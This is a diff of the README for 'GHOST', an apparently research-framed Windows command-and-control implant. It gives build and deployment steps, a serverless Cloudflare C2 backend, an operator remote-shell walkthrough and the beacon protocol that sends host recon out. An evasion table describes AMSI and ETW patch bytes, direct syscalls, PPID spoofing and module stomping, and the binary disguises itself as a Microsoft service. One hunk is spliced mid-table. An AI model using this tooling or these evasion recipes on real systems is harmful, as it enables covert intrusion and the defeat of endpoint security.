@@ -1,472 +1,106 @@
-# GHOST — Windows C2 Implant Framework
+# GHOST: Advanced Windows Implant & C2 Infrastructure
 
-> Research-grade command-and-control framework for red team operations.
-> Built as a PhD final-year project studying EDR evasion and implant architecture.
+**GHOST** is an advanced, stealthy Windows implant and Command & Control (C2) infrastructure designed for authorized Red Team operations and defensive research. 
 
----
+It demonstrates state-of-the-art evasion techniques in a fully air-gapped or restricted environment, utilizing a serverless Cloudflare Worker backend for untraceable, highly-resilient communication.
 
-## Architecture
+> [!WARNING]
+> **Authorized Use Only**: This software is provided strictly for academic research and authorized penetration testing. 
 
-```
-┌───────────────────────────────────────────────────────────┐
-│                     OPERATOR SIDE                         │
-│                                                           │
-│   ┌──────────┐     HTTPS (TLS 1.2+)     ┌────────────┐   │
-│   │  c2_cli  │ ◄──────────────────────►  │  c2_server │   │
-│   │ (Python) │   X-Operator-Token auth   │  (Flask)   │   │
-│   └──────────┘                           └─────┬──────┘   │
-│                                                │          │
-│                                          ┌─────▼──────┐   │
-│                                          │   SQLite    │   │
-│                                          │  ghost.db   │   │
-│                                          └────────────┘   │
-└───────────────────────────────────────────────────────────┘
-                           ▲
-                           │ HTTPS POST /beacon, /result
-                           │ X-Beacon-Token auth
-                           │ Jittered interval (45-180s)
-                           ▼
-┌───────────────────────────────────────────────────────────┐
-│                     IMPLANT SIDE                          │
-│                                                           │
-│   ┌──────────────────────────────────────────────────┐    │
-│   │                  ghost.exe                       │    │
-│   │                                                  │    │
-│   │  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │    │
-│   │  │ Syscalls │  │ Evasion  │  │  Persistence │   │    │
-│   │  │ (ntdll)  │  │ AMSI/ETW │  │  (WMI Sub)   │   │    │
-│   │  └────┬─────┘  └────┬─────┘  └──────┬───────┘   │    │
-│   │       │              │               │           │    │
-│   │  ┌────▼──────────────▼───────────────▼───────┐   │    │
-│   │  │              BeaconLoop                   │   │    │
-│   │  │  WinHTTP → JSON → cmd.exe /C → result    │   │    │
-│   │  └───────────────────────────────────────────┘   │    │
-│   │                                                  │    │
-│   │  ┌──────────────────────────────────────────┐    │    │
-│   │  │  Injection (PPID spoof, module stomp)    │    │    │
-│   │  └──────────────────────────────────────────┘    │    │
-│   └──────────────────────────────────────────────────┘    │
-│                                                           │
-│   Target: Windows 10/11 x64 · Static CRT (/MT)           │
-│   Subsystem: GUI (no console window)                      │
-└───────────────────────────────────────────────────────────┘
+## Features
+
+### Infrastructure
+* **Serverless C2**: 100% serverless backend using Cloudflare Workers and KV storage. No static IPs to block, routes through Cloudflare's massive CDN.
+* **Asynchronous Beaconing**: "Dead drop" architecture. The implant and operator never communicate directly.
+* **Two-Tier Authentication**: Distinct, constant-time verified tokens for Implant Beacons (`BEACON_TOKEN`) and Operator CLI (`OPERATOR_TOKEN`).
+* **Operator CLI**: Interactive Python-based shell for session management, task queuing, and result polling.
+
+### Payload (Implant)
+* **Direct WinHTTP Transport**: Operates entirely over standard HTTPS (port 443) using the native Windows HTTP stack.
+* **Jittered Sleep**: Randomized beacon intervals (45s–180s) to disrupt behavioral network analysis.
+* **Encrypted Config**: C2 domain strings are XOR-encrypted and decrypted at runtime using a key derived from the target's FNV-1a hostname hash.
+* **GUI Subsystem**: Compiled as a Windows GUI application (`-mwindows`) to run silently without a console window.
+* **Statically Linked**: No external CRT dependencies (`/MT` or `-static`), standalone `.exe`.
+
+## Architecture Diagram
+
+```mermaid
+graph TD
+    subgraph Target Environment
+        A[GHOST Implant]
+    end
+
+    subgraph Cloudflare Edge
+        B(Cloudflare Worker API)
+        C[(Workers KV Storage)]
+    end
+    
+    subgraph Operator Environment
+        D[Operator CLI]
+    end
+
+    A -- "POST /beacon (Encrypted Task/Result Sync)" --> B
+    B <--> C
+    D -- "HTTPS API (Task Queuing / Polling)" --> B
 ```
 
----
+## Quick Start
 
-## Components
-
-| Component | File(s) | Description |
-|---|---|---|
-| **Direct Syscall Manager** | `src/syscalls.cpp`, `include/syscalls.hpp` | Extracts SSNs from clean ntdll copy, builds `mov r10,rcx; mov eax,SSN; syscall; ret` stubs |
-| **Evasion Stack** | `src/evasion.cpp`, `include/evasion.hpp` | AMSI patch, ETW patch, hardware breakpoint clearing, Defender exclusion |
-| **C2 Beacon** | `src/c2.cpp`, `include/c2.hpp` | WinHTTP HTTPS client with JSON protocol, adaptive backoff, auth tokens |
-| **Command Execution** | `src/c2.cpp` | `CreateProcess` with pipe capture, 64 KB output cap, 30s timeout |
-| **Injection** | `src/injection.cpp`, `include/injection.hpp` | PPID spoofing, remote process injection, module stomping |
-| **Persistence** | `src/persistence.cpp`, `include/persistence.hpp` | WMI `CommandLineEventConsumer` + `__EventFilter` subscriptions |
-| **Utilities** | `src/utils.cpp`, `include/utils.hpp` | UTF conversion, Base64, FNV-1a hashing, XOR cipher, jitter sleep |
-| **C2 Server** | `server/c2_server.py` | Flask HTTPS listener with SQLite, token auth, rate limiting, audit log |
-| **Operator CLI** | `server/c2_cli.py` | Interactive shell with session management, colored output, result polling |
-
----
-
-## MITRE ATT&CK Mapping
-
-| Technique ID | Name | Implementation |
-|---|---|---|
-| T1106 | Native API | Direct syscalls via ntdll SSN extraction |
-| T1055.001 | Process Injection: DLL Injection | `InjectRemoteProcess` — NtAllocate/Write/Protect/CreateThread |
-| T1055.001 | Process Injection: Module Stomping | `StompModule` — overwrite .text of signed DLL |
-| Python | 3.10+ |
-| OpenSSL | Any (for cert generation) |
-
-### Server (Cloudflare Worker — distributed)
-
-| Requirement | Version |
-|---|---|
-| Node.js | 18+ |
-| Wrangler CLI | 3.22+ (`npm install -g wrangler`) |
-| Cloudflare Account | Free tier works for development |
-
-> **Full architecture details, data flow diagrams, KV schema, and OPSEC analysis are in
-> [SYSTEM_DESIGN.md](file:///c:/Users/lamic/OneDrive/Desktop/ghostimplant/SYSTEM_DESIGN.md).**
-
----
-
-## Build Instructions
-
-### Option A: PowerShell (Direct cl.exe)
-
-```powershell
-# 1. Open Developer PowerShell for VS 2022
-#    Start Menu → "Developer PowerShell for VS 2022"
-#    OR from a regular PowerShell:
-cmd /c '"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" && powershell'
-
-# 2. Navigate to project root
-cd C:\path\to\ghostimplant
-
-# 3. Build release
-.\build.ps1
-
-# 4. Build debug (symbols, no optimization)
-.\build.ps1 -Debug
-
-# Output: build\ghost.exe
-```
-
-### Option B: CMake
-
-```powershell
-# 1. Open Developer PowerShell (same as above)
-
-# 2. Configure
-cmake -B build -G "Visual Studio 17 2022" -A x64
-
-# 3. Build release
-cmake --build build --config Release
-
-# 4. Build debug
-cmake --build build --config Debug
-
-# Output: build\bin\Release\ghost.exe  or  build\bin\Debug\ghost.exe
-```
-
-### Option C: Linux Cross-Compilation (MinGW-w64)
-
-```bash
-# 1. Install MinGW-w64
-sudo apt update && sudo apt install mingw-w64
-
-# 2. Make build script executable
-chmod +x build.sh
-
-# 3. Build release
-./build.sh
-
-# Output: build/ghost.exe
-```
-
-### Build Output
-
-| Config | Flags | Stack cookies | LTCG | Output |
-|---|---|---|---|---|
-| Release | `/O2 /GS- /GL` | Disabled | Yes | `build\ghost.exe` |
-| Debug | `/Od /Zi` | Enabled | No | `build\ghost.exe` |
-
----
-
-## Server Setup
-
-### 1. Generate TLS Certificate
-
-```bash
-cd server/
-
-# Self-signed cert for lab use (valid 365 days)
-openssl req -x509 -newkey rsa:4096 \
-  -keyout server.key -out server.crt \
-  -days 365 -nodes \
-  -subj "/CN=localhost"
-```
-
-### 2. Install Python Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 3. Generate Auth Tokens
-
-```bash
-# Generate two separate tokens
-python -c "import secrets; print('BEACON:', secrets.token_hex(32))"
-python -c "import secrets; print('OPERATOR:', secrets.token_hex(32))"
-```
-
-### 4. Start the Server
-
-```powershell
-# Set tokens (PowerShell)
-$env:GHOST_BEACON_TOKEN   = "<beacon_token_from_step_3>"
-$env:GHOST_OPERATOR_TOKEN = "<operator_token_from_step_3>"
-
-# Optional: configure session timeout (default: 600s)
-$env:GHOST_SESSION_TIMEOUT = "600"
-
-# Start
-python c2_server.py
-```
-
-```bash
-# Linux/macOS alternative
-export GHOST_BEACON_TOKEN="<beacon_token>"
-export GHOST_OPERATOR_TOKEN="<operator_token>"
-python3 c2_server.py
-```
-
-Server starts on `0.0.0.0:443` with TLS.
-
----
-
-## Cloudflare Worker Deployment (Alternative)
-
-Use this instead of the Flask server for a distributed, serverless C2 backend.
-
-### 1. Install Wrangler
-
-```bash
-npm install -g wrangler
-wrangler login
-```
-
-### 2. Create KV Namespace
-
-```bash
-cd worker/
-npm install
-
-# Create production KV namespace
-wrangler kv:namespace create GHOST_KV
-# Output: { binding = "GHOST_KV", id = "abc123..." }
-
-# Copy the ID into wrangler.toml:
-#   [[kv_namespaces]]
-#   binding = "GHOST_KV"
-#   id = "abc123..."
-```
-
-### 3. Set Secrets
-
-```bash
-# These are encrypted at rest in Cloudflare's infrastructure
-wrangler secret put BEACON_TOKEN
-# Enter value: <paste your beacon token>
-
-wrangler secret put OPERATOR_TOKEN
-# Enter value: <paste your operator token>
-```
-
-### 4. Deploy
-
-```bash
-wrangler deploy
-# Output: https://ghost-c2.<your-subdomain>.workers.dev
-```
-
-### 5. Verify
-
-```bash
-# Health check (no auth)
-curl https://ghost-c2.<your-subdomain>.workers.dev/health
-
-# List sessions (with auth)
-curl -H "X-Operator-Token: <token>" \
-     https://ghost-c2.<your-subdomain>.workers.dev/sessions
-```
-
-### 6. Monitor Logs
-
-```bash
-# Real-time log stream
-wrangler tail
-```
-
----
-
-### Update Implant Config
-
-Before building the implant, edit `src/c2.cpp`:
-
-```cpp
-// Replace with your beacon token
-const wchar_t* BEACON_TOKEN = L"<same_beacon_token_as_server>";
-
-// Replace with XOR-encrypted C2 server address
-const uint8_t C2_DOMAIN_ENCRYPTED[] = { /* your encrypted bytes */ };
-```
-
----
-
-## Operator CLI Usage
-
-```bash
-# Set environment
-export GHOST_OPERATOR_TOKEN="<your_operator_token>"
-export GHOST_C2_URL="https://127.0.0.1"
-
-# Or use flags
-python c2_cli.py --token <TOKEN> --url https://10.0.0.1 <command>
-```
-
-### Commands
-
-```bash
-# List active sessions
-python c2_cli.py sessions
-
-# Queue a command
-python c2_cli.py task <session_id> "whoami /all"
-
-# Retrieve results
-python c2_cli.py results <session_id>
-
-# Interactive shell (auto-polls for results)
-python c2_cli.py shell <session_id>
-
-# Kill a session (queues 'exit' command)
-python c2_cli.py kill <session_id>
-
-# View operator audit log
-python c2_cli.py audit --limit 50
-```
-
-### Interactive Shell
-
-```
-$ python c2_cli.py shell abc123
-[*] Entering shell mode for session abc123
-[*] Type 'bg' to background, 'exit' to kill session.
-
-ghost(abc123)> whoami
-[*] Waiting for result...
-DESKTOP-LAB\admin
-
-ghost(abc123)> ipconfig /all
-[*] Waiting for result...
-Windows IP Configuration
-   Host Name . . . . . . . . : DESKTOP-LAB
-   ...
-
-ghost(abc123)> bg
-[-] Backgrounding session (not killed).
-```
-
----
-
-## C2 Protocol
-
-### Beacon (Implant → Server)
-
-```
-POST /beacon HTTP/1.1
-Host: c2.example.com
-Content-Type: application/json
-X-Beacon-Token: <token>
-
-{
-  "session": "a1b2c3d4|admin",
-  "recon": {
-    "hostname": "DESKTOP-LAB",
-    "user": "admin",
-    "build": 22631,
-    "elevated": true,
-    "amsi": true,
-    "etw": true,
-    "hwbps": true
-  }
-}
-```
-
-**Response** (task queued):
-```json
-{"cmd": "whoami /all"}
-```
-
-**Response** (no task):
-```json
-{"cmd": "sleep"}
-```
-
-### Result (Implant → Server)
-
-```
-POST /result HTTP/1.1
-Content-Type: application/json
-X-Beacon-Token: <token>
-
-{
-  "session": "a1b2c3d4|admin",
-  "output": "DESKTOP-LAB\\admin"
-}
-```
-
----
-
-## Operational Security Features
-
-| Feature | Detail |
-|---|---|
-| Static CRT | `/MT` — no `msvcrt.dll` dependency |
-| GUI subsystem | No console window on execution |
-| Jittered beacon | Uniform random sleep in `[45, 180]` seconds |
-| Adaptive backoff | 3× sleep multiplier after 5 consecutive failures |
-| XOR-encrypted strings | C2 domain encrypted with hostname-derived key |
-| Benign IAT | Only Windows API imports; sensitive functions resolved dynamically |
-| Legitimate metadata | PE version info mimics Windows Security Health Service |
-| Token auth | Beacon and operator use separate tokens |
-| TLS 1.2+ | Server enforces minimum TLS version |
-| Rate limiting | Per-endpoint limits prevent abuse |
-| Audit trail | All operator actions logged with timestamp and IP |
-
----
+For a complete step-by-step walkthrough of deployment, configuration, building, and running the implant, see the [**START_GUIDE.md**](START_GUIDE.md).
 
 ## Project Structure
 
-```
+```text
 ghostimplant/
-├── include/
-│   ├── c2.hpp              # Session struct, beacon/result/execute declarations
-│   ├── config.hpp          # All tunable constants (tokens, timing, limits)
-│   ├── evasion.hpp         # AMSI/ETW/HW BP/Defender exclusion declarations
-│   ├── injection.hpp       # PPID spoof, remote inject, module stomp declarations
-│   ├── persistence.hpp     # WMI persistence declarations
-│   ├── syscalls.hpp        # Nt* function typedefs and SyscallTable struct
-│   └── utils.hpp           # String conversion, Base64, hashing, system info
-├── src/
-│   ├── main.cpp            # WinMain entry point — init, evasion, persist, beacon
-│   ├── c2.cpp              # WinHTTP transport, JSON, command execution, config defs
-│   ├── evasion.cpp         # AMSI/ETW/HW BP patches (stubs — implement per research)
-│   ├── injection.cpp       # Process injection techniques (stubs)
-│   ├── persistence.cpp     # WMI event subscription persistence (stubs)
-│   ├── syscalls.cpp        # SSN extraction and stub generation (stubs)
-│   └── utils.cpp           # UTF conversion, Base64, FNV-1a, RtlGetVersion, jitter
-├── resources/
-│   ├── ghost.rc            # PE version info (mimics legitimate Microsoft binary)
-│   └── ghost.manifest      # Application manifest (asInvoker, Win10/11 compat)
-├── server/
-│   ├── c2_server.py        # Flask HTTPS C2 listener with auth + rate limiting
-│   ├── c2_cli.py           # Operator CLI with interactive shell mode
-│   └── requirements.txt    # Python dependencies
-├── worker/
-│   ├── src/
-│   │   └── index.ts        # Cloudflare Worker C2 backend (serverless)
-│   ├── wrangler.toml       # Cloudflare deployment config + KV binding
-│   ├── tsconfig.json       # TypeScript compiler config
-│   └── package.json        # Node.js dependencies (wrangler, types)
-├── CMakeLists.txt          # CMake build config (Debug/Release, LTCG)
-├── build.ps1               # PowerShell build script (direct cl.exe)
-├── SYSTEM_DESIGN.md        # Full architecture, data flow, OPSEC, ATT&CK mapping
-├── .gitignore
-└── README.md
+├── src/                # Implant C++ Source
+│   ├── main.cpp        # Entry point and payload execution
+│   ├── c2.cpp          # WinHTTP transport and beaconing logic
+│   ├── utils.cpp       # Crypto, FNV-1a hashing, string conversions
+│   └── *.cpp           # Stub implementations (syscalls, evasion)
+├── include/            # C++ Headers
+├── worker/             # Cloudflare Worker Backend
+│   ├── src/index.ts    # Serverless C2 API routing and logic
+│   └── wrangler.toml   # Cloudflare deployment configuration
+├── server/             # Operator Environment
+│   ├── c2_cli.py       # Interactive command line interface
+│   └── requirements.txt
+├── tools/
+│   └── encrypt_domain.py # Generates XOR payload config
+├── build.ps1           # Windows MSVC Build Script
+├── build.sh            # Linux MinGW Cross-Compile Script
+├── START_GUIDE.md      # Step-by-step deployment guide
+└── SYSTEM_DESIGN.md    # Advanced architectural and OPSEC documentation
 ```
 
----
+## Compilation
+
+You must configure the `BEACON_TOKEN` and the XOR-encrypted domain in `src/c2.cpp` before compiling. See [START_GUIDE.md](START_GUIDE.md) for details.
+
+### Windows (MSVC)
+Requires Visual Studio Build Tools (Desktop development with C++).
+```powershell
+.\build.ps1 -Debug   # Output: build\bin\Debug\ghost.exe
+.\build.ps1          # Output: build\bin\Release\ghost.exe
+```
+
+### Linux (MinGW-w64 Cross-Compilation)
+```bash
+sudo apt update && sudo apt install mingw-w64
+chmod +x build.sh
+./build.sh           # Output: build/ghost.exe
+```
 
 ## Evasion Technique Reference
 
-> **Note:** Evasion modules are provided as documented stubs with algorithm descriptions.
-> Implementation is left to the researcher per their specific engagement scope.
+> **Note:** Evasion modules are provided as documented stubs with algorithm descriptions. Implementation is left to the researcher per their specific engagement scope.
 
-| Technique | Algorithm (in stub comments) | Detection Surface |
+| Technique | Algorithm | Detection Surface |
 |---|---|---|
-| AMSI bypass | LoadLibrary `amsi.dll` → GetProcAddress `AmsiScanBuffer` → VirtualProtect RWX → patch `xor eax,eax; ret` | ETW `Microsoft-Antimalware-Scan-Interface`, Sysmon Event ID 7 |
-| ETW bypass | GetProcAddress `EtwEventWrite` from ntdll → VirtualProtect RWX → patch `ret` (0xC3) | Kernel ETW provider audit, integrity checking |
-| HW breakpoint clear | `CreateToolhelp32Snapshot` → enumerate threads → `GetThreadContext` → zero DR0-DR3 → `SetThreadContext` | Thread context modification events |
-| Direct syscalls | Read clean ntdll from disk → parse PE exports → extract SSN from `4C 8B D1 B8 XX XX` pattern → build RWX stubs | Memory scanning for syscall stub patterns |
-| PPID spoofing | `InitializeProcThreadAttributeList` → `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` → `CreateProcess` | Sysmon Event ID 1 (parent PID mismatch) |
-| Module stomping | Map legitimate DLL → find .text RVA → VirtualProtect RW → overwrite with shellcode → restore RX | Memory integrity scanning, unbacked executable pages |
-| WMI persistence | Connect `ROOT\subscription` → create `CommandLineEventConsumer` + `__EventFilter` + binding | Sysmon Event ID 19/20/21, WMI activity logs |
+| **AMSI Bypass** | LoadLibrary `amsi.dll` → GetProcAddress `AmsiScanBuffer` → VirtualProtect RWX → patch `xor eax,eax; ret` | ETW `Microsoft-Antimalware-Scan-Interface`, Sysmon Event ID 7 |
+| **ETW Bypass** | GetProcAddress `EtwEventWrite` from ntdll → VirtualProtect RWX → patch `ret` (0xC3) | Kernel ETW provider audit, integrity checking |
+| **Direct Syscalls** | Read clean ntdll from disk → parse PE exports → extract SSN from `4C 8B D1 B8 XX XX` pattern → build RWX stubs | Memory scanning for syscall stub patterns |
+| **PPID Spoofing** | `InitializeProcThreadAttributeList` → `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` → `CreateProcess` | Sysmon Event ID 1 (parent PID mismatch) |
+| **Module Stomping**| Map legitimate DLL → find .text RVA → VirtualProtect RW → overwrite with shellcode → restore RX | Memory integrity scanning, unbacked executable pages |
 
 ---
 
@@ -478,9 +112,3 @@ It is part of a PhD research project studying EDR evasion techniques and implant
 - Do **not** use this tool against systems you do not own or have explicit written authorization to test.
 - The authors are not responsible for misuse.
 - All testing should be conducted in **isolated lab environments**.
-
----
-
-## License
-
-For academic/research use only. Not licensed for commercial or unauthorized use.
